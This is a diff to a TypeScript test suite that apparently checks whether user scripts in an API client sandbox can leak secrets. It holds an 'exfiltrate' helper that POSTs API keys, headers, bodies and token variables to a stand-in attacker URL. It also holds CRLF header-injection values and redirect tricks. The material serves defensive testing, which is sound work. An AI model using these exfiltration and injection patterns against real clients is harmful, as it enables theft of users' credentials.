@@ -30,7 +30,7 @@ function exfiltrate(values: string): string {
     return `
         const read = ${values};
         for (const [name, value] of Object.entries(read)) {
-            await sendRequest({ url: '${attack.evil.url}/' + name, method: 'POST', body: String(value) });
+            await mandor.sendRequest({ url: '${attack.evil.url}/' + name, method: 'POST', body: String(value) });
         }
     `;
 }
@@ -44,14 +44,14 @@ describe('a script that reads what the person wrote around a secret', () => {
             body: { type: 'json', content: '{"k":"{{token}}"}' },
             ...scripts(
                 exfiltrate(`{
-                    header: request.headers.get('x-api-key'),
-                    nested: request.headers.get('x-nested'),
-                    url: request.url,
-                    query: request.query.get('k'),
-                    body: request.body,
-                    replaced: vars.replaceIn('{{token}}'),
-                    replacedNested: vars.replaceIn('{{a}}'),
-                    nestedVar: vars.get('a'),
+                    header: mandor.request.headers.get('x-api-key'),
+                    nested: mandor.request.headers.get('x-nested'),
+                    url: mandor.request.url,
+                    query: mandor.request.query.get('k'),
+                    body: mandor.request.body,
+                    replaced: mandor.variables.replaceIn('{{token}}'),
+                    replacedNested: mandor.variables.replaceIn('{{a}}'),
+                    nestedVar: mandor.variables.get('a'),
                 }`),
             ),
         });
@@ -81,9 +81,9 @@ describe('a script that reads what the person wrote around a secret', () => {
             ...scripts(
                 undefined,
                 exfiltrate(`{
-                    header: request.headers.get('x-api-key'),
-                    url: request.url,
-                    query: request.query.get('k'),
+                    header: mandor.request.headers.get('x-api-key'),
+                    url: mandor.request.url,
+                    query: mandor.request.query.get('k'),
                 }`),
             ),
         });
@@ -103,8 +103,8 @@ describe('a server that hands the secret back outside the body', () => {
             ...scripts(
                 undefined,
                 exfiltrate(`{
-                    all: JSON.stringify(response.headers),
-                    one: response.headers.get('x-reflect'),
+                    all: JSON.stringify(mandor.response.headers),
+                    one: mandor.response.headers.get('x-reflect'),
                 }`),
             ),
         });
@@ -121,8 +121,8 @@ describe('a script that sends on its own with what the person keeps', () => {
         await attack.send({
             url: '{{baseUrl}}/echo',
             ...scripts(`
-                await sendRequest({
-                    url: vars.get('baseUrl') + '/own?k={{token}}',
+                await mandor.sendRequest({
+                    url: mandor.variables.get('baseUrl') + '/own?k={{token}}',
                     method: 'POST',
                     headers: { 'X-Api-Key': '{{token}}', 'X-Nested': '{{a}}' },
                     body: '{{token}} {{a}}',
@@ -152,8 +152,8 @@ describe('a script that points the send where no http goes', () => {
             url: '{{baseUrl}}/echo',
             ...scripts(`
                 let said = 'answered';
-                try { await sendRequest({ url: '${url}' }); } catch (error) { said = 'refused'; }
-                request.headers.set('X-Said', said);
+                try { await mandor.sendRequest({ url: '${url}' }); } catch (error) { said = 'refused'; }
+                mandor.request.headers.set('X-Said', said);
             `),
         });
 
@@ -165,7 +165,7 @@ describe('a script that points the send where no http goes', () => {
         const moved = await attack.send({
             url: '{{baseUrl}}/echo',
             headers: [KEY_LINE],
-            ...scripts(`request.url = '${url}';`),
+            ...scripts(`mandor.request.url = '${url}';`),
         });
 
         expect(moved.ok).toBe(false);
@@ -177,8 +177,8 @@ describe('a script that points the send where no http goes', () => {
         const answer = await attack.send({
             url: '{{baseUrl}}/echo',
             ...scripts(`
-                request.headers.set('X-A', 'v\\r\\nX-Injected: 1');
-                request.headers.set('X-B\\r\\nX-Smuggled', '1');
+                mandor.request.headers.set('X-A', 'v\\r\\nX-Injected: 1');
+                mandor.request.headers.set('X-B\\r\\nX-Smuggled', '1');
             `),
         });
 
